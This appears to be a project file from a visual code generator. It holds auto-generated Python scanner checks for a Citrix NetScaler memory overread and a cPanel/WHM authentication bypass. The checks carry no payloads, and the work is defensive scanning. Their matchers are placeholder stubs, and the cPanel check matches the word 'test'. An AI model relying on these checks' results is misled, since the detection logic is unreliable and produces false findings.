          "u9",
          "rce"
        ],
        "cvss_score": 10.0
      }
    ],
    "variables": [
      {
        "id": "nv_gv_001",
        "name": "NUCLEI_TARGET",
        "datatype": "string",
        "description": "URL ou hostname de la cible par défaut",
        "default": "https://target.example.com"
      },
      {
        "id": "nv_gv_002",
        "name": "NUCLEI_RATE_LIMIT",
        "datatype": "int",
        "description": "Limite de requêtes par seconde",
        "default": "150"
      },
      {
        "id": "nv_gv_003",
        "name": "NUCLEI_SEVERITY_FILTER",
        "datatype": "string",
        "description": "Filtre de sévérité par défaut",
        "default": "medium,high,critical"
      }
    ]
  },
  "canvas": {
    "blocks": [
      {
        "block_id": "a7227389",
        "block_type": "function",
        "data": {
          "id": "fn_nuclei_c_v_e_2026_3055",
          "name": "Citrix NetScaler SAML IDP - Memory Overread",
          "language": "Python",
          "famille": "CVE",
          "description": "NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP",
          "severity": "critical",
          "detection": "[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302",
          "parameters": [
            {
              "name": "target",
              "datatype": "string",
              "required": true,
              "description": "Hostname ou IP de la cible"
            }
          ],
          "returns": {
            "datatype": "Finding",
            "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
          },
          "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-3055\nName: Citrix NetScaler SAML IDP - Memory Overread\nSeverity: critical\nDescription: NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_3055:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-3055\"\n    SEVERITY = \"critical\"\n    NAME = \"Citrix NetScaler SAML IDP - Memory Overread\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['(?i)NSC_TASS=[A-Za-z0-9+/]+=*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Citrix NetScaler SAML IDP - Memory Overread\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_3055(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
          "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-3055\nName: Citrix NetScaler SAML IDP - Memory Overread\nSeverity: critical\nDescription: NetScaler ADC and NetScaler Gateway contain an insufficient input validation vulnerability when configured as a SAML IDP, leading to memory overread, letting attackers potentially access sensitive memory, exploit requires configuration as SAML IDP\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_3055:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-3055\"\n    SEVERITY = \"critical\"\n    NAME = \"Citrix NetScaler SAML IDP - Memory Overread\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: regex('(?i)NSC_TASS=[A-Za-z0-9+/]+=*', set_cookie); status_code == 302\"\n\n        # Simple word matcher simulation\n        matchers = ['(?i)NSC_TASS=[A-Za-z0-9+/]+=*']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Citrix NetScaler SAML IDP - Memory Overread\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_3055(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
          "cve": [],
          "tags": [
            "cve",
            "cve2026",
            "netscaler",
            "citrix",
            "exposure",
            "kev",
            "vkev",
            "vuln"
          ],
          "cvss_score": 10.0
        },
        "pos": {
          "x": 450,
          "y": 145
        },
        "is_group": false,
        "children_ids": []
      },
      {
        "block_id": "2aa1e4ee",
        "block_type": "function",
        "data": {
          "id": "fn_nuclei_c_v_e_2026_41940",
          "name": "cPanel & WHM - Authentication Bypass via Session-File CRLF Injection",
          "language": "Python",
          "famille": "CVE",
          "description": "cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.",
          "severity": "critical",
          "detection": "[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401",
          "parameters": [
            {
              "name": "target",
              "datatype": "string",
              "required": true,
              "description": "Hostname ou IP de la cible"
            }
          ],
          "returns": {
            "datatype": "Finding",
            "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
          },
          "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-41940\nName: cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\nSeverity: critical\nDescription: cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_41940:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-41940\"\n    SEVERITY = \"critical\"\n    NAME = \"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_41940(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
          "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2026-41940\nName: cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\nSeverity: critical\nDescription: cPanel and WHM versions prior to 11.110.0.97, 11.118.0.63, 11.126.0.54, 11.132.0.29, 11.134.0.20, and 11.136.0.5 contain an authentication bypass vulnerability in the login flow that allows unauthenticated remote attackers to gain unauthorized access to the control panel.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2026_41940:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2026-41940\"\n    SEVERITY = \"critical\"\n    NAME = \"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code == 401; contains(header, \"whostmgrrelogin\") / [OR] DSL: status_code == 307; contains(location, \"cpsess\") / [OR] DSL: status_code == 401'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"cPanel & WHM - Authentication Bypass via Session-File CRLF Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2026_41940(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
          "cve": [],
          "tags": [
            "cve",
            "cve2026",
            "cpanel",
            "whm",
            "auth-bypass",
            "crlf",
            "vkev",
            "kev"
          ],
          "cvss_score": 10.0
        },
        "pos": {
          "x": 450,
          "y": 377
        },
        "is_group": false,
        "children_ids": []
      },
      {
        "block_id": "bbdc68e7",
        "block_type": "variable",
        "data": {
          "id": "nv_gv_001",
          "name": "NUCLEI_TARGET",
          "datatype": "string",
          "description": "URL ou hostname de la cible par défaut",
          "default": "https://target.example.com"
        },
        "pos": {
          "x": 15,
          "y": 268
        },
        "is_group": false,
        "children_ids": []
      }
    ],
    "connections": [
      {
        "src_block": "bbdc68e7",
        "src_port": "NUCLEI_TARGET",
        "tgt_block": "a7227389",
        "tgt_port": "target"
      },
      {
        "src_block": "bbdc68e7",
        "src_port": "NUCLEI_TARGET",
        "tgt_block": "2aa1e4ee",
        "tgt_port": "target"
      }
    ]
  },
  "output": {
    "language": "Python",
    "name": "GeneratedProgram",
    "code": ""
  }
}